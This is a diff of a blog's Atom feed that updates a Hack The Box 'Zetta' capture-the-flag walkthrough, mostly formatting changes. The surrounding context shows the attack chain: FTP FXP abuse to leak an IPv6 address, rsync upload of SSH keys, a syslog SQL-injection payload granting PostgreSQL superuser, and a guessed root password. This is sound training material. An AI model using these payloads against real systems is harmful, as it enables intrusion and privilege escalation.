@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-02-22T18:26:24+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-02-22T18:48:50+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
 Hi there, I am a nerd guy who loves everything in between Internet and Security and reach out to people to teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
 </subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Zetta</title><link href="http://localhost:4000/2020/02/22/htb-zetta.html" rel="alternate" type="text/html" title="Hack The Box: Zetta" /><published>2020-02-22T00:00:00+05:45</published><updated>2020-02-22T00:00:00+05:45</updated><id>http://localhost:4000/2020/02/22/htb-zetta</id><content type="html" xml:base="http://localhost:4000/2020/02/22/htb-zetta.html">&lt;hr /&gt;
 &lt;h1 id=&quot;htbzetta&quot;&gt;HTB:Zetta&lt;/h1&gt;
@@ -9,7 +9,7 @@ Hi there, I am a nerd guy who loves everything in between Internet and Security 
 
 &lt;p&gt;&lt;img src=&quot;/public/images/description_box.png&quot; alt=&quot;description_box&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;In above picture it’s ip is 10.10.10.156, I added it to /etc/hosts as zetta.htb. Let’s solve this box.&lt;/p&gt;
+&lt;p&gt;In above picture it’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.156&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;zetta.htb&lt;/code&gt;. Let’s solve this box.&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -41,7 +41,7 @@ Nmap &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;at Sat Jan 25 22:30:28 20
 &lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;&lt;em&gt;zetta.htb&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;After I noticed port 80 opened I visited that site and got this as output.&lt;/p&gt;
+&lt;p&gt;After I noticed port 80 &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; opened I visited that site and got this as output.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/public/images/front_page.jpg&quot; alt=&quot;front_page&quot; /&gt;&lt;/p&gt;
 
@@ -57,7 +57,7 @@ Native FTP We support native FTP with FXP enabled. We also support RFC2428.&lt;/
 
 &lt;h3 id=&quot;ftp&quot;&gt;FTP&lt;/h3&gt;
 
-&lt;p&gt;With this detail I m into the FTP server now as.&lt;/p&gt;
+&lt;p&gt;With this detail I m into the &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; server now as.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ftp zetta.htb
 Connected to zetta.htb.
@@ -79,7 +79,7 @@ Using binary mode to transfer files.
 ftp&amp;gt; 
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;here you can see FXP transfers supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this &lt;a href=&quot;https://tools.ietf.org/html/rfc2428&quot;&gt;RFC2428&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;here you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;FXP transfers&lt;/code&gt; supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this &lt;a href=&quot;https://tools.ietf.org/html/rfc2428&quot;&gt;RFC2428&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;At first I had set tcpdump listner as&lt;/p&gt;
 
@@ -125,7 +125,7 @@ seq 2652376284, win 28800, options [mss 1337,sackOK,TS val 1847133177 ecr 0,nop,
 seq 0, ack 2652376285, win 0, length 0
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IP6 and got this with rsync service at port 8730 as&lt;/p&gt;
+&lt;p&gt;I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IPV6 and got this with rsync service at port 8730 as&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$sudo nmap -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 22:23 +0545
@@ -167,7 +167,7 @@ Nmap done: 1 IP address (1 host up) scanned in 320.92 seconds
 
 &lt;h4 id=&quot;script-in-python&quot;&gt;Script in Python&lt;/h4&gt;
 
-&lt;p&gt;From here I got username &lt;em&gt;roy&lt;/em&gt; now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from &lt;a href=&quot;https://&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;From here I got username &lt;code class=&quot;highlighter-rouge&quot;&gt;roy&lt;/code&gt; now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from &lt;a href=&quot;https://&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-`&quot;&gt;#!/bin/python3
 
@@ -189,11 +189,11 @@ Now I tried to download the id_rsa key of roy user but that fails since roy didn
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; rsync -rdt authorized_keys -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:7d3b]:8730/home_roy/.ssh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Here now authorized_keys let me to  shell of user roy and also I had used the user roy along with it’s password &lt;em&gt;computer&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Here now authorized_keys let me to  shell of user roy and also I had used the user roy along with it’s password &lt;code class=&quot;highlighter-rouge&quot;&gt;computer&lt;/code&gt;.&lt;/p&gt;
 
 &lt;h1 id=&quot;shell-as-roy&quot;&gt;Shell as roy&lt;/h1&gt;
 
-&lt;p&gt;Finally I got the shell of roy and got the &lt;em&gt;user.txt&lt;/em&gt; as&lt;/p&gt;
+&lt;p&gt;Finally I got the shell of roy and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; as&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh roy@zetta.htb
 Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
@@ -292,11 +292,11 @@ Type &quot;help&quot; for help.
 
 syslog=&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got &lt;em&gt;COPY FROM PROGRAM Command Execution vulnerability&lt;/em&gt;. For more info about it you can click &lt;a href=&quot;https://www.exploit-db.com/exploits/46813&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got &lt;code class=&quot;highlighter-rouge&quot;&gt;COPY FROM PROGRAM Command Execution vulnerability&lt;/code&gt;. For more info about it you can click &lt;a href=&quot;https://www.exploit-db.com/exploits/46813&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog &lt;a href=&quot;https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;On reading blogs to use &lt;em&gt;COPY&lt;/em&gt; command user must be superuser only then I can exploit it. For that I changed the user &lt;em&gt;roy&lt;/em&gt; to superuser as&lt;/p&gt;
+&lt;p&gt;On reading blogs to use &lt;code class=&quot;highlighter-rouge&quot;&gt;COPY&lt;/code&gt; command user must be superuser only then I can exploit it. For that I changed the user &lt;em&gt;roy&lt;/em&gt; to superuser as&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@zetta:~$ logger -p local7.info &quot;aaa',current_timestamp);ALTER USER roy WITH SUPERUSER; --&quot;                                                             
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -421,7 +421,7 @@ ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;From above two notes: format of password of user posgres and todo list I made conclusion as password root should be &lt;code class=&quot;highlighter-rouge&quot;&gt;sup3rs3cur3p4ass@root&lt;/code&gt;.
-Finally that worked and got the root shell and root.txt.&lt;/p&gt;
+Finally that worked and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;root shell&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;postgres@zetta:~$ su root
 Password: 
@@ -434,7 +434,7 @@ root@zetta:~# cat root.txt
 b9407e837fb****************
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box jkr for such an awesome box.&lt;/p&gt;
+&lt;p&gt;This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;jkr&lt;/code&gt; for such an awesome box.&lt;/p&gt;
 
 &lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;br /&gt;
 Feedback are really appreciated !!&lt;br /&gt;
